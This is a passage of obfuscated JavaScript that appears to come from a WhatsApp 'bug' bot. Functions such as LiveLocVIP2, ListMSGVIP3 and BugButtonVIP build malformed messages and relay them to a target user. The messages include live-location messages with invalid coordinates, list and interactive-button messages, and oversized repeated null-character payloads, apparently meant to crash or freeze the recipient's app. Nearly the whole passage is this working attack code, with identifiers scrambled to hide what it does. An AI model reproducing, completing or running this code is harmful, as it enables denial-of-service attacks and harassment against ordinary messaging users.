_0x163324+_0x451642;},'vouGO':_0x37b91f(0x64,-0xcc,-0x267,0xcb,-0xd7)+_0x362f6d(0x94,0x2e5,0xe3,0x1c2,0x309),'wzvqq':_0x18d8cc(0x599,0x252,0x4a2,0x39e,0x4f9),'cwYBC':_0x37b91f(-0x2e8,-0x123,-0xfe,-0x2ed,-0x38d)+_0x18d8cc(0x65d,0x193,0x437,0x241,0x430)+_0x3d2f53(0x48c,0x79e,0x733,0x7f3,0x756)+'2','NijlF':_0x362f6d(0x21d,0x1c9,0x1d2,0x2c2,0x274)+_0x18d8cc(0x1a0,0x203,0x5ce,0x114,0x39f)+_0x29d1a3(0x5ef,0x73f,0x77d,0x9df,0x650)+'t','hKbxG':_0x18d8cc(0x240,0x690,0x545,0x699,0x4bb),'AaWrx':_0x37b91f(-0x1bf,0x42,0xb,0x29f,-0xda)+_0x29d1a3(0x7b5,0x9bf,0x830,0x829,0xaaa),'tKGxq':_0x37b91f(0x186,-0x7f,-0x137,0x58,-0x303)+_0x3d2f53(0x409,0x25d,0x2bb,0x25d,0x47a)+_0x29d1a3(0x776,0x92b,0x8ad,0x762,0x772)+_0x362f6d(0x55a,0x475,0x73e,0x879,0x69b)+'at','OKMbv':_0x362f6d(0x42f,0x619,0x378,0x721,0x60c)+_0x362f6d(0x6df,0x70f,0x4aa,0x382,0x4d2),'KAkNY':_0x362f6d(0x201,0x31d,0x494,0x3a8,0x351)+_0x37b91f(-0x102,-0xbe,0xbb,-0x30a,-0x302)+_0x362f6d(0x26f,0x1d3,0x4ce,0x750,0x49c)};function _0x37b91f(_0x47b004,_0x4b783e,_0x7b54c9,_0x20ef51,_0x43c0d7){return _0x307533(_0x47b004-0x152,_0x47b004,_0x7b54c9-0xcf,_0x20ef51-0x12d,_0x4b783e- -0x217);}function _0x3d2f53(_0x16a538,_0x1945fa,_0x1cf6de,_0xf6c318,_0x1966b2){return _0xf1b353(_0x16a538-0x28,_0x1945fa-0x9e,_0x16a538,_0xf6c318-0x39,_0x1cf6de- -0x4d);}const _0x2a6537={};function _0x18d8cc(_0x3e48ce,_0x37233a,_0x368064,_0x4f7b4e,_0x345ded){return _0x279901(_0x37233a,_0x37233a-0x5e,_0x368064-0x1dd,_0x345ded-0x298,_0x345ded-0x4f);}_0x2a6537[_0x29d1a3(0x7e9,0x981,0x83d,0x8a6,0x754)+_0x18d8cc(0x24f,0x4a7,0x230,0x16a,0x2b0)+_0x29d1a3(0x5c1,0x8a6,0x70f,0x67a,0x9dd)+_0x18d8cc(0x92e,0x7a2,0x579,0x77e,0x7c6)+'id']=0x4433e2e130,_0x2a6537[_0x29d1a3(0x8a5,0x63c,0x83d,0x92c,0x775)+_0x29d1a3(0x3ea,0x3ed,0x541,0x4ca,0x344)+_0x3d2f53(0x391,0x22a,0x497,0x216,0x711)+_0x18d8cc(0x512,0x64e,0x407,0x86e,0x6d5)+_0x18d8cc(0x52e,0x1fa,0x50e,0x294,0x366)+'d']=!![];const _0x3816eb=_0x36a984[_0x29d1a3(0x7ad,0x53a,0x673,0x698,0x434)](generateWAMessageFromContent,_0x276400,proto[_0x362f6d(0x7bd,0x546,0x7ce,0x695,0x590)+'ge'][_0x3d2f53(0x36a,0x263,0x2c8,0x272,0x9c)+_0x37b91f(0x115,0x298,0xd4,0x1e2,0x49e)]({'listMessage':{'title':_0x36a984[_0x362f6d(0x214,0x2b7,0x657,0x60f,0x3c5)](_0x36a984[_0x362f6d(0x6bf,0x892,0x5a4,0x5b6,0x6fb)],'\x00'[_0x37b91f(0x19d,0x12d,0x2e5,-0x151,0x1e0)+'t'](-0x6*0x3b62a+-0x4edc*0x11+0x2ac3d7)),'footerText':'.','description':'.','buttonText':null,'listType':0x2,'productListInfo':{'productSections':[{'title':_0x36a984[_0x37b91f(-0x156,-0xe1,-0x1fc,-0x130,-0x227)],'products':[{'productId':_0x36a984[_0x18d8cc(0x5e4,0x7ed,0x7c7,0x672,0x549)]}]}],'productListHeaderImage':{'productId':_0x36a984[_0x18d8cc(0x6ac,0x333,0x2ab,0x653,0x549)],'jpegThumbnail':null},'businessOwnerJid':_0x36a984[_0x37b91f(0x1b6,-0x16,-0x134,-0x2b5,-0x98)]}},'footer':_0x36a984[_0x3d2f53(0x4a2,0x970,0x741,0x920,0x5dc)],'contextInfo':{'expiration':0x93a80,'ephemeralSettingTimestamp':_0x36a984[_0x3d2f53(0x7f3,0x836,0x7e6,0x83f,0x6f8)],'entryPointConversionSource':_0x36a984[_0x362f6d(0x471,0x726,0x53f,0x46a,0x62c)],'entryPointConversionApp':_0x36a984[_0x18d8cc(0x44d,0xfd,0x434,0x2cf,0x307)],'entryPointConversionDelaySeconds':0x9,'disappearingMode':{'initiator':_0x36a984[_0x37b91f(0x5,0xb1,-0xd7,0x157,0x1e0)]}},'selectListType':0x2,'product_header_info':_0x2a6537}),{'userJid':_0x276400});function _0x362f6d(_0x309d1,_0x3b6b85,_0x49f103,_0x401c56,_0x1f42ba){return _0x30a091(_0x1f42ba-0x39d,_0x3b6b85,_0x49f103-0x124,_0x401c56-0x111,_0x1f42ba-0x14);}function _0x29d1a3(_0x47b462,_0x42ab60,_0x59a855,_0x391b19,_0x3b0dac){return _0xf1b353(_0x47b462-0x1aa,_0x42ab60-0x129,_0x3b0dac,_0x391b19-0x82,_0x59a855-0x22b);}await VxoZap[_0x18d8cc(0x464,0x4ef,0x197,0x1fa,0x416)+_0x37b91f(0x484,0x1e6,0xb7,0x1bd,0x102)+'ge'](_0x276400,_0x3816eb[_0x3d2f53(0x814,0x4b1,0x715,0x605,0x882)+'ge'],{'participant':{'jid':_0x276400},'messageId':_0x3816eb[_0x18d8cc(0x728,0x89d,0x940,0x542,0x7a2)]['id']});}async function LiveLocVIP2(_0x3f4508){function _0x3f4fe6(_0x29113f,_0xa6edba,_0x5c372a,_0x263cd3,_0x21a990){return _0x279901(_0x263cd3,_0xa6edba-0x164,_0x5c372a-0x1b0,_0x21a990-0x57c,_0x21a990-0x1bf);}function _0x20c3ad(_0x287e56,_0x42e653,_0x5db0cf,_0x3c150f,_0x84f88b){return _0x30a091(_0x5db0cf-0x668,_0x3c150f,_0x5db0cf-0x16e,_0x3c150f-0x149,_0x84f88b-0xf2);}function _0x16e515(_0x1f13d5,_0x5abb4c,_0xd5ea85,_0x2dc500,_0x156e66){return _0x30a091(_0x5abb4c-0x634,_0x1f13d5,_0xd5ea85-0x1ac,_0x2dc500-0x19f,_0x156e66-0x170);}const _0x3f1af5={'hntpH':function(_0x19d24f,_0x3d2153,_0x22c605,_0x30ff4a){return _0x19d24f(_0x3d2153,_0x22c605,_0x30ff4a);},'DjGMs':function(_0x9399c3,_0x4dbbd5){return _0x9399c3+_0x4dbbd5;},'EdtHH':_0x16e515(0x9e2,0x9a4,0x6e5,0xbb4,0x9d7)+_0x54dd42(0x5f9,0x49b,0x67c,0x27e,0x470)+_0x16e515(0x78c,0x9b1,0xb51,0x886,0xa70)+_0x54dd42(0x654,0x4e1,0x4ad,0x590,0x220)+_0x20c3ad(0x409,0x313,0x4e6,0x2e3,0x2b8)+_0x3f4fe6(0x7f1,0x4c8,0x8d4,0x51c,0x6c5)+'™½','TdNpg':_0x54dd42(0x2b0,0x105,-0x1b8,0x20e,-0x168)};function _0x54dd42(_0x30c3b2,_0x4e896c,_0x3b0481,_0x179199,_0x25b510){return _0xf1b353(_0x30c3b2-0x61,_0x4e896c-0x4d,_0x30c3b2,_0x179199-0x7c,_0x4e896c- -0x296);}const _0x2eb78f=_0x3f1af5[_0x383bce(0x1fa,0x29e,0x41d,0x2f0,0xfc)](generateWAMessageFromContent,_0x3f4508,proto[_0x54dd42(0x61e,0x3c8,0xf1,0x61a,0x2fd)+'ge'][_0x383bce(0x2ed,-0xe4,-0xed,0x115,-0x21)+_0x3f4fe6(0x73e,0xc41,0x8f7,0xc4d,0x98e)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':_0x3f1af5[_0x16e515(0x5ae,0x81b,0xaa4,0x573,0x8d4)](_0x3f1af5[_0x54dd42(0x60d,0x3e6,0x5c2,0x181,0x139)],_0x3f1af5[_0x383bce(0x6bd,0x3f7,0x213,0x462,0x324)][_0x3f4fe6(0xa1d,0x8b0,0xa36,0xaa0,0x823)+'t'](-0x7f8f+0x119e3+0x28fc)),'sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':_0x3f4508});function _0x383bce(_0x5eacfb,_0x1d89c4,_0x571eac,_0x1487d8,_0x2720ea){return _0x30a091(_0x1487d8-0x26b,_0x5eacfb,_0x571eac-0x3,_0x1487d8-0xb7,_0x2720ea-0x1f2);}await VxoZap[_0x3f4fe6(0x67b,0x44b,0x902,0x643,0x6fa)+_0x3f4fe6(0xb31,0x6c8,0x8c4,0x655,0x8dc)+'ge'](_0x3f4508,_0x2eb78f[_0x20c3ad(0x77c,0xbfa,0x95f,0xb77,0xa7f)+'ge'],{'participant':{'jid':_0x3f4508},'messageId':_0x2eb78f[_0x20c3ad(0xc72,0xaf3,0xa05,0x87c,0xc3a)]['id']});}async function ListMSGVIP2(_0xf30314){const _0x34e34e={'PqWfb':function(_0x1de560,_0x45f083,_0x475421,_0x3d3ba6){return _0x1de560(_0x45f083,_0x475421,_0x3d3ba6);},'fCMnP':function(_0x647bdd,_0x54ee20){return _0x647bdd+_0x54ee20;},'saZZa':_0x46bd96(0x39a,0x1a2,-0xd1,0x230,0x439)+_0x46bd96(0x472,0x425,0x2c6,0x291,0x3d9)+_0x11b312(0x5a2,0x63e,0x7c3,0x60f,0x7db)+_0x11b312(0x709,0x5a0,0x7f6,0x816,0xa68)+_0x232bac(0x2d1,0x202,0xb4,0x253,0x365)+_0x277d68(0x87d,0x96a,0x8c5,0x889,0xa62)+_0x46bd96(0x420,0x1f9,0x322,0x411,0x2d2)+_0x232bac(-0x193,0xdd,0x129,0x29f,0x37b)+_0x232bac(0x560,0x2c0,0x40e,0x320,0x1ad)+_0x232bac(0x4ad,0x26b,0xdd,0x395,0x3e5)+_0x46bd96(0x31a,0x20f,0x417,0x47b,0x1f7)+_0x277d68(0x712,0x6a2,0x685,0x7b6,0x871)+_0xc5b7(0x439,0x29b,0x617,0x4b4,0x390)+_0x11b312(0x192,0x572,0x41d,0x4d3,0x616)+_0x232bac(-0x6f,-0x16f,-0x1dc,-0x18b,0xcc)+_0x46bd96(0x220,0x425,0x685,0x2df,0x230)+_0xc5b7(0x7a2,0x99d,0xa3b,0x85a,0x62c)+_0x277d68(0x7ef,0xa3f,0x926,0x8d6,0xa78),'ElKlP':_0x46bd96(0x189,0x158,0x12c,0x3f,0x4e)+_0xc5b7(0x39a,0x565,0x705,0x615,0x831)+_0x11b312(0x800,0x745,0x6a2,0x595,0x7a4)+_0xc5b7(0x343,0x6c5,0x35c,0x543,0x7e6)+_0xc5b7(0x84a,0x89a,0x73b,0x784,0x4e4)+_0x232bac(-0x15b,-0xfd,-0x5f,0x41,0x37)+_0x46bd96(0x37c,0x1b6,0x443,0x1b6,0x3e0)+_0x277d68(0xb1c,0x721,0x956,0x971,0x8d6)+_0x277d68(0xb83,0x837,0xa20,0xb92,0x7df)+_0x232bac(0x15e,0x130,-0xe9,0x2cc,0x2e3)+_0x277d68(0x7ca,0x56d,0x6c3,0x711,0x7a9)+_0x11b312(0x550,0x645,0x7a4,0xa32,0xa6e)+_0x11b312(0x8f9,0xa3d,0x818,0xaed,0xab6)+_0x46bd96(0x46e,0x5c3,0x4ca,0x45f,0x4d1),'teJPA':_0x11b312(0xaca,0x8db,0x814,0x58a,0x7ef),'rcDJq':_0x232bac(0x175,-0x161,-0x419,-0x16d,-0x109)+_0x232bac(0x240,-0x20,-0x74,-0x185,0x5)+_0x232bac(0x3ae,0x2ca,0x4a1,0x53,0x142)+'2','pNCpt':_0xc5b7(0x637,0x282,0x3d5,0x4b5,0x627)+_0x232bac(-0x248,-0xb1,0xbc,-0x256,0x1b5)+_0xc5b7(0x474,0x41c,0x5f0,0x6c5,0x756)+'t','DawTW':_0x46bd96(0x216,0x372,0x2fc,0x5c6,0x3f4)+_0x11b312(0x4e9,0x8f4,0x6d4,0x5e0,0x5bd),'HApGc':_0x11b312(0x6e5,0x2c7,0x4c8,0x2f1,0x72a)+_0xc5b7(0x45d,0x71c,0x3d8,0x47b,0x24c)+_0x277d68(0x7be,0x718,0x881,0xaa6,0x727)+_0x277d68(0x7d1,0x716,0x968,0xb08,0xb9b)+'at','CPElo':_0x11b312(0xa16,0x7a9,0x7a9,0x7dd,0x911)+_0xc5b7(0x66f,0x714,0x985,0x713,0x844),'kWebB':_0x11b312(0x4a8,0x58e,0x4ee,0x3b1,0x792)+_0xc5b7(0x6e6,0x4aa,0x3e3,0x52d,0x3ab)+_0xc5b7(0x4db,0x43f,0x82f,0x6dd,0x679)};function _0xc5b7(_0x173f4f,_0xe4291,_0x3d4990,_0x25cb42,_0x5a0ed1){return _0x279901(_0xe4291,_0xe4291-0x48,_0x3d4990-0x10b,_0x25cb42-0x471,_0x5a0ed1-0x57);}const _0x5d9a17={};function _0x277d68(_0x5a9096,_0x48f9c2,_0x31b4be,_0x3df7d5,_0x392bd5){return _0x29f0b3(_0x5a9096-0x27,_0x48f9c2-0x1ab,_0x3df7d5,_0x3df7d5-0x185,_0x31b4be-0x59d);}function _0x232bac(_0x40e2e4,_0x17ca25,_0x3b4ab8,_0x1b8acd,_0x4bd59b){return _0xf1b353(_0x40e2e4-0x1f3,_0x17ca25-0x160,_0x40e2e4,_0x1b8acd-0x13,_0x17ca25- -0x4b6);}function _0x11b312(_0x42c331,_0x58e78b,_0x46bdc1,_0x1c5d36,_0x5e4c7b){return _0x307533(_0x42c331-0x182,_0x1c5d36,_0x46bdc1-0x1ae,_0x1c5d36-0x1cb,_0x46bdc1-0x330);}_0x5d9a17[_0x11b312(0x546,0x510,0x6e1,0x7ad,0x880)+_0x46bd96(-0xa3,0x1ce,0x20a,0x399,0x175)+_0xc5b7(0x818,0x898,0x78f,0x657,0x839)+_0x277d68(0x7e3,0xa6a,0xa2b,0xca9,0x9d7)+'id']=0x4433e2e130,_0x5d9a17[_0x232bac(0x33d,0x15c,0x3d5,-0x9b,0x406)+_0x46bd96(0x367,0x1ce,-0x49,0x3d4,0x343)+_0x11b312(0x30c,0x820,0x5b3,0x5d4,0x511)+_0x11b312(0x8e8,0x8cf,0x80a,0x579,0x7c6)+_0xc5b7(0x282,0x5f3,0x4b8,0x53f,0x31b)+'d']=![];const _0x19dc17=_0x34e34e[_0x11b312(0x766,0x829,0x5cd,0x836,0x3c9)](generateWAMessageFromContent,_0xf30314,proto[_0x46bd96(0x4eb,0x516,0x450,0x772,0x5b9)+'ge'][_0x11b312(0x4ae,0x152,0x3e4,0x424,0x2e6)+_0x232bac(0x31b,0x25a,0x453,0x42f,0x440)]({'listMessage':{'title':_0x34e34e[_0x232bac(0x142,0x1c,-0x48,0x2c3,0x15)](_0x34e34e[_0x46bd96(-0x45,0x228,-0x7e,0x1ef,0x3d2)],'\x00'[_0x46bd96(0x3fc,0x45d,0x46d,0x203,0x5cf)+'t'](0x29764*-0xa+-0x15c12e+0x1eda6b*0x2)),'footerText':_0x34e34e[_0x232bac(0x523,0x24d,0x106,0x2c3,0x1a3)],'description':_0x34e34e[_0x46bd96(0x365,0x5bb,0x56d,0x805,0x3da)],'buttonText':null,'listType':0x2,'productListInfo':{'productSections':[{'title':_0x34e34e[_0x46bd96(0x8c3,0x671,0x42b,0x778,0x3b3)],'products':[{'productId':_0x34e34e[_0x46bd96(0x621,0x510,0x333,0x7b9,0x348)]}]}],'productListHeaderImage':{'productId':_0x34e34e[_0x277d68(0x643,0x76f,0x857,0x580,0x586)],'jpegThumbnail':null},'businessOwnerJid':_0x34e34e[_0x11b312(0x82f,0x8a4,0x86b,0x922,0x6ce)]}},'footer':_0x34e34e[_0x232bac(0x289,0x303,0x4c8,0x4c,0x316)],'contextInfo':{'expiration':0x927c0,'ephemeralSettingTimestamp':_0x34e34e[_0x232bac(0x382,0x12f,-0xfb,0x1f8,0x2a3)],'entryPointConversionSource':_0x34e34e[_0xc5b7(0x71c,0x7b7,0x39d,0x5c8,0x73f)],'entryPointConversionApp':_0x34e34e[_0x46bd96(0x6f3,0x63f,0x4e6,0x8ae,0x579)],'entryPointConversionDelaySeconds':0x9,'disappearingMode':{'initiator':_0x34e34e[_0xc5b7(0x56d,0x832,0x50b,0x71c,0x86d)]}},'selectListType':0x2,'product_header_info':_0x5d9a17}),{'userJid':_0xf30314});function _0x46bd96(_0x25f4e9,_0x4d47cb,_0x3633a1,_0x3e1213,_0x328511){return _0x307533(_0x25f4e9-0x141,_0x25f4e9,_0x3633a1-0x122,_0x3e1213-0x15a,_0x4d47cb-0x119);}await VxoZap[_0x232bac(0x176,-0x3a,-0xd9,-0x3a,0x238)+_0x277d68(0x9db,0x7a8,0x85d,0x6db,0x6fe)+'ge'](_0xf30314,_0x19dc17[_0x46bd96(0x39f,0x61a,0x480,0x8c1,0x60f)+'ge'],{'participant':{'jid':_0xf30314},'messageId':_0x19dc17[_0xc5b7(0xacf,0xadf,0x800,0x97b,0xa43)]['id']});}async function ListMSGVIP3(_0x4269b9){function _0x9f08f7(_0x232545,_0x276f8d,_0x267c80,_0x235c89,_0x28a600){return _0x29f0b3(_0x232545-0xf6,_0x276f8d-0x54,_0x232545,_0x235c89-0xca,_0x28a600- -0x38);}function _0x25e91e(_0x13355f,_0x53fbea,_0x2da2b9,_0x4a7641,_0x33c397){return _0x307533(_0x13355f-0x1d5,_0x4a7641,_0x2da2b9-0x14c,_0x4a7641-0x7b,_0x33c397- -0x2);}const _0x4704b1={'DkzcK':function(_0x44fa95,_0x311e05,_0x9a5180,_0x4f638c){return _0x44fa95(_0x311e05,_0x9a5180,_0x4f638c);},'GgaDC':_0x37d3d1(-0x2a,-0xfa,-0xb,-0x1fa,0x23c)+_0x9f08f7(-0x127,-0x7a,0x211,-0x37,0x1),'XZCmq':_0x37d3d1(0x281,0x439,0x47e,0x2b9,0x2d2)+'rl','pHwEe':_0x2089a0(0x28a,0x135,0xcd,0x248,-0xb2)+_0x58d90c(0x5f4,0x7c5,0x412,0x498,0x624)+_0x25e91e(-0x8,0x59,0x2fe,-0x116,0x19e)+_0x37d3d1(0x8e,-0xc8,0x203,-0x1bc,-0x1e7)+_0x37d3d1(0x44a,0x58b,0x3d3,0x1b9,0x656)+_0x2089a0(0x284,0x1d2,0x465,0x221,-0x83)+_0x9f08f7(0x133,0x14,-0x111,0x474,0x1c7)+_0x25e91e(0x2de,-0x3f,0x506,0x3fd,0x256)+_0x58d90c(0x65b,0x6ba,0x398,0x90b,0x688)+_0x9f08f7(-0x76,0x118,0x359,-0x17c,0xbe)+_0x58d90c(0x862,0x872,0xb37,0xa06,0x9a0)},_0xf1ffec=_0x4704b1[_0x58d90c(0x8d2,0x671,0xb2e,0x729,0x6c8)](generateWAMessageFromContent,_0x4269b9,proto[_0x2089a0(0x533,0x4be,0x2ad,0x381,0x291)+'ge'][_0x2089a0(0xa0,0x175,-0x12,0x2d3,0x2c8)+_0x9f08f7(0x175,0x1a5,0x3a8,0x171,0x33a)]({'viewOnceMessage':{'message':{'interactiveMessage':{'header':{'title':'','subtitle':_0x4704b1[_0x2089a0(0x4ed,0x65f,0x400,0x761,0x87b)]},'body':{'text':_0x4704b1[_0x9f08f7(0x48e,0x206,0x327,0x47c,0x429)]},'footer':{'text':_0x4704b1[_0x9f08f7(0x1b9,0x29c,0x6a8,0x3b8,0x429)]},'nativeFlowMessage':{'buttons':[{'name':_0x4704b1[_0x37d3d1(0x3d6,0x3ca,0x69e,0x12a,0x644)],'buttonParamsJson':_0x4704b1[_0x2089a0(0x23c,0x19a,-0xcb,0x7d,0x1ce)]},{'name':_0x4704b1[_0x25e91e(0x3b9,0x3b7,0x71d,0x65f,0x549)],'buttonParamsJson':_0x4704b1[_0x25e91e(0x20c,0x2ef,-0x173,0x59,0xd7)]},{'name':_0x4704b1[_0x37d3d1(0x3d6,0x541,0x120,0x479,0x67d)],'buttonParamsJson':_0x4704b1[_0x58d90c(0x477,0x3eb,0x3b5,0x595,0x48c)]}],'messageParamsJson':''[_0x25e91e(0x357,0x1cb,0x162,0x22b,0x342)+'t'](0x1*-0x26d38+-0x129c*-0xb2+0x4beff)}}}}}),{'userJid':_0x4269b9});function _0x58d90c(_0x54f374,_0x409ed8,_0x51db2b,_0x466d60,_0x3e3306){return _0xf1b353(_0x54f374-0x4b,_0x409ed8-0x1c0,_0x3e3306,_0x466d60-0x12a,_0x54f374-0x13d);}function _0x2089a0(_0x17aded,_0x32bf3d,_0x25f3e5,_0x55a590,_0x1b09f5){return _0x279901(_0x55a590,_0x32bf3d-0x6b,_0x25f3e5-0xbe,_0x32bf3d-0x15e,_0x1b09f5-0xcf);}function _0x37d3d1(_0x2d975a,_0x2dcaa5,_0x33df8c,_0x149c1f,_0x4fed82){return _0x30a091(_0x2d975a-0x95,_0x4fed82,_0x33df8c-0x87,_0x149c1f-0x11e,_0x4fed82-0xc6);}await VxoZap[_0x9f08f7(0x22b,0x22d,-0xf4,0x96,0xa6)+_0x2089a0(0x312,0x4be,0x2e0,0x674,0x770)+'ge'](_0x4269b9,_0xf1ffec[_0x37d3d1(0x38c,0x289,0xe9,0x493,0x21d)+'ge'],{'participant':{'jid':_0x4269b9},'messageId':_0xf1ffec[_0x37d3d1(0x432,0x455,0x3bb,0x2e8,0x583)]['id']});}async function LiveLocVIP3(_0x3893fc){function _0xbc8d(_0x19ec6e,_0x260b8a,_0xad515,_0x12bb4d,_0x2b769d){return _0x29f0b3(_0x19ec6e-0x109,_0x260b8a-0x1a2,_0x260b8a,_0x12bb4d-0xe3,_0x19ec6e- -0x30);}function _0x31f8f7(_0x14ee90,_0x13325c,_0x260f5b,_0x458e90,_0x3f19f5){return _0x30a091(_0x3f19f5-0x585,_0x14ee90,_0x260f5b-0xb0,_0x458e90-0xfc,_0x3f19f5-0xe9);}const _0x46f322={'iuSfx':function(_0x1cf83f,_0x2aa968,_0x3473d0,_0x3be6e0){return _0x1cf83f(_0x2aa968,_0x3473d0,_0x3be6e0);},'vVcit':function(_0x59a9e0,_0x50d2c7){return _0x59a9e0+_0x50d2c7;},'SAtHw':_0x129fcc(0xc0,0x395,0x313,0x275,0x26b)+_0x129fcc(0x170,0x84,0x90,-0x44,-0xc0)+_0x129fcc(0x2ef,0x2cb,0x397,0x53d,0x2b1),'IJkHP':_0x129fcc(-0x4b,0x141,-0xbe,-0x6,0x1d1)};function _0x431609(_0x3cc789,_0x1a5aa4,_0x36061f,_0x46b74b,_0x3f3996){return _0x30a091(_0x1a5aa4-0x485,_0x36061f,_0x36061f-0x11a,_0x46b74b-0xde,_0x3f3996-0x198);}function _0xab322(_0x4e4192,_0x13c094,_0x4770bb,_0x484d1d,_0x5821aa){return _0x30a091(_0x13c094-0x408,_0x4770bb,_0x4770bb-0x154,_0x484d1d-0x15b,_0x5821aa-0x117);}function _0x129fcc(_0x58fff1,_0x1eaf78,_0x11e49e,_0x1388b9,_0x1df33c){return _0xf1b353(_0x58fff1-0x1b8,_0x1eaf78-0x170,_0x1388b9,_0x1388b9-0xe1,_0x1eaf78- -0x40d);}var _0x1e8c51=_0x46f322[_0xab322(0x62c,0x6cf,0x3f7,0x599,0x487)](generateWAMessageFromContent,_0x3893fc,proto[_0xbc8d(0x290,0x155,0x43a,0x431,0x3cc)+'ge'][_0x431609(0x1fd,0x32f,0x56d,0x408,0x66)+_0xbc8d(0x342,0x22a,0x24c,0x2d6,0x10a)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':_0x46f322[_0x431609(0x49e,0x3f3,0x157,0x521,0x471)](_0x46f322[_0x31f8f7(0x617,0x410,0x64c,0x692,0x4d5)],_0x46f322[_0xbc8d(0x102,-0x29,-0x41,0x3d5,-0x133)][_0x431609(0x4f8,0x5bf,0x435,0x6d8,0x611)+'t'](-0x5bc9*-0x1+-0x4d6*0x31+-0x25d5*-0x9)),'sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':_0x3893fc});await VxoZap[_0xab322(0x4d3,0x419,0x18c,0x505,0x552)+_0xbc8d(0x290,0x454,0x1c,0x547,0x4b8)+'ge'](_0x3893fc,_0x1e8c51[_0xab322(0x8e0,0x6ff,0x925,0x4c1,0x44f)+'ge'],{'participant':{'jid':_0x3893fc},'messageId':_0x1e8c51[_0x129fcc(0x516,0x3fb,0x284,0x666,0x54e)]['id']});}async function BugButtonVIP(_0x3e04b1){const _0x59bd4d={'TUjvH':function(_0x38357c,_0x29b7c5,_0x4a5055,_0x14bf98){return _0x38357c(_0x29b7c5,_0x4a5055,_0x14bf98);},'cDnOf':_0x5837e2(0x507,0x813,0x5ff,0x80b,0x760)+'rl','teGYv':_0x13efad(-0x129,-0x4b,-0x3ec,0x30,-0x1e9)+_0x4a429f(0x4a2,0x55c,0x455,0x4a9,0x2de)+_0x5837e2(0x449,0x238,0x3a9,0x5f5,0x18f)+_0x5837e2(0x10f,0x2ea,0x352,0x49b,0x4d6)+_0x13efad(0x314,0x216,0x29d,0x28e,0x335)+_0x2a0b78(0x68c,0x5c8,0x4ec,0x67c,0x60e)+_0x5837e2(0x639,0x43e,0x3c4,0x48f,0x173)+_0x4a429f(0x798,0x875,0x5d0,0x7c9,0x81e)+_0x4a429f(0x588,0x822,0x752,0x2be,0x577)+_0x13efad(-0x177,-0x29d,0xa8,0x1b9,-0x33)};function _0x5837e2(_0x3aedd2,_0xb1d085,_0x173efb,_0x2e34bd,_0x3853b2){return _0x30a091(_0x173efb-0x413,_0xb1d085,_0x173efb-0x81,_0x2e34bd-0x161,_0x3853b2-0x57);}const _0x2dc69f={};_0x2dc69f[_0x5837e2(0x9ad,0x9b4,0x765,0x7c0,0x927)]='',_0x2dc69f[_0x2d458a(0xcd,0x578,0x199,0x31b,0x365)+_0x4a429f(0x608,0x55f,0x496,0x62e,0x37b)]='';const _0x3f91ca={};function _0x2a0b78(_0x2e4d07,_0x1eadd4,_0x4666aa,_0x4b6bab,_0x4636aa){return _0x30a091(_0x1eadd4-0x33c,_0x2e4d07,_0x4666aa-0x146,_0x4b6bab-0x1f,_0x4636aa-0x1df);}_0x3f91ca[_0x5837e2(0x4d3,0x430,0x350,0x266,0x17c)]='';const _0x16635b={};_0x16635b[_0x4a429f(0x393,0x605,0x488,0x52c,0x302)]='';function _0x4a429f(_0x288bfe,_0x122651,_0x2752cc,_0x43c83e,_0x4e784d){return _0xf1b353(_0x288bfe-0x16d,_0x122651-0xc7,_0x43c83e,_0x43c83e-0x156,_0x288bfe- -0x15);}function _0x2d458a(_0x3efb30,_0x5062ab,_0x72a54b,_0x454daf,_0x1b8dc3){return _0x29f0b3(_0x3efb30-0x1a6,_0x5062ab-0x11e,_0x454daf,_0x454daf-0x128,_0x1b8dc3-0x3d7);}function _0x13efad(_0x6b4123,_0xdae33e,_0x288f05,_0x3f1b45,_0x564d86){return _0x30a091(_0x564d86- -0x53,_0xdae33e,_0x288f05-0xe1,_0x3f1b45-0x33,_0x564d86-0x19a);}var _0x4eeb3d=_0x59bd4d[_0x2a0b78(0x723,0x6f6,0x496,0x76f,0x923)](generateWAMessageFromContent,_0x3e04b1,proto[_0x4a429f(0x649,0x3d5,0x8f3,0x6f0,0x8b7)+'ge'][_0x5837e2(0x28d,0xbe,0x2bd,0x84,0x24d)+_0x2a0b78(0x88a,0x5e1,0x6c4,0x378,0x6f6)]({'viewOnceMessage':{'message':{'interactiveMessage':{'header':_0x2dc69f,'body':_0x3f91ca,'footer':_0x16635b,'nativeFlowMessage':{'buttons':[{'name':_0x59bd4d[_0x4a429f(0x6f5,0x7d1,0x9aa,0x805,0x530)],'buttonParamsJson':_0x59bd4d[_0x13efad(0x223,0x9,0x409,0x418,0x2b5)]}],'messageParamsJson':'\x00'[_0x2a0b78(0x500,0x476,0x562,0x385,0x1e2)+'t'](-0x16e59b*-0x1+-0x130364+-0x29f*-0x457)}}}}}),{'userJid':_0x3e04b1});await VxoZap[_0x2a0b78(0xe7,0x34d,0x524,0x1bf,0x525)+_0x2d458a(0x3cc,0x940,0x8d4,0x6dd,0x697)+'ge'](_0x3e04b1,_0x4eeb3d[_0x5837e2(0x8ea,0x772,0x70a,0x8df,0x4bf)+'ge'],{'participant':{'jid':_0x3e04b1},'messageId':_0x4eeb3d[_0x13efad(0xfd,0x249,0xc4,0x2ae,0x34a)]['id']});}async function ListMSGVIP4(_0x528b27){const _0x20a095={'wTYUs':function(_0x283de8,_0x4347e7,_0x5d6407,_0x45c335){return _0x283de8(_0x4347e7,_0x5d6407,_0x45c335);},'kdKVU':function(_0x48a23c,_0x929fcb){return 